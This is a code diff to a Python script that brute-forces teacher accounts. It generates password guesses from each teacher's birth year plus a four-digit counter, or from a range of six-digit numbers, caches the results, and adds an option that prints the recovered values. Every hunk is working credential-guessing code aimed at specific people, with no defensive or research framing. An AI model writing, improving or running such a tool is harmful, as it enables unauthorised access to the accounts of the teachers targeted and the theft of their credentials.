@@ -188,7 +188,7 @@ def password_dump_cache(username, password_set, cache_name = None,
             with open(cache_name,'w') as f:
                json.dump(rd,f)
         except:
-            if os.path.exists('{}.bat'.format(cach_name)):
+            if os.path.exists('{}.bat'.format(cache_name)):
                shutil.copyfile('{}.bak'.format(cache_name), cache_name)
         
     
@@ -196,7 +196,8 @@ def password_dump_cache(username, password_set, cache_name = None,
                          callback = _callback, prev_rd = prev_rd,
                          verbose = verbose)
     
-def password_dump_teacher(teacher_list):
+def password_dump_four(teacher_list):
+    # [(username1, birth1), ..., (username_n,birth_n)]
     for username, birth in teacher_list:
         password_set = [birth[-2:]+str(n).zfill(4) for n in range(0,10000)]
         password_dump_cache(username, password_set)
@@ -207,7 +208,22 @@ def password_dump_six(teacher_list, verbose = True):
         password_set = [str(n).zfill(6) for n in range(10000,320000)]
         password_dump_cache(username, password_set, verbose = verbose)
         
-def report_cache(teacher_list):
+def password_dump_teacher(teacher_list):
+    # proxy for union iterface `password_dump_teacher`, `password_dump_si`
+    head = teacher_list[0]
+    try:
+        username, birth = head
+        label = 'four'
+    except:
+        label = 'six'
+    if label == 'four':
+        password_dump_four(teacher_list)
+    elif label == 'six':
+        password_dump_six(teacher_list)
+    else:
+        raise Exception('Unknow config info')
+        
+def report_cache(teacher_list, extract = False):
     td = {}
     if not isinstance(teacher_list[0], (str,int,float)):
         teacher_list = zip(*teacher_list)[0]
@@ -224,6 +240,11 @@ def report_cache(teacher_list):
             false_count = len([value for value in info.values() if value == False])
             none_count = len([value for value in info.values() if value == None])
             print('{}: true {} false {} none {} / {}'.format(username,true_count,false_count,none_count,count ))
+            if extract:
+                if false_count <= 3:
+                    print([value for value in info.values() if value == False])
+                else:
+                    print('false_count > 3, extract action truncated.')
     return td
 
 '''
